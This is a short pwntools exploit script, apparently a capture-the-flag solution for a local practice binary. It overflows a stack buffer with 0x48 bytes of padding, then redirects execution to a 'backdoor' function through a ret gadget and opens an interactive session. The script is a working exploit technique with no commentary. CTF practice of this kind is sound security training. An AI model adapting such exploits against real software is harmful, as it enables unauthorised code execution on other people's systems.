from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-l 100']
context.log_level = 'debug'
file_name = './pwn'
ld_name = './ld-linux-x86-64.so.2'
io = process([ld_name, '--library-path', '.', file_name])
libc = ELF('./libc.so.6')
elf = ELF(file_name)
pr = lambda x:success('\x1b[01;38;5;214m'+hex(x)+'\x1b[0m')
sl = lambda x:io.sendline(x)
s  = lambda x:io.send(x) 
rt = lambda x:io.recvuntil(x)
ri = lambda x:int(io.recv(x),16)
ru = lambda x:u64(io.recv(x).ljust(8,b'\x00'))
it = lambda  :io.interactive()
sp = lambda  :sleep(1.5)
q  = lambda  :sleep(0.2)

OFF = 0x48
BACKDOOR = 0x401156
RET = 0x000000000040101a 

def build():
    pd = b'a'*OFF
    pd += flat(RET,BACKDOOR)
    return pd

#gdb.attach(io,"b *0x4011A9")
pay = build()
s(pay)
it()
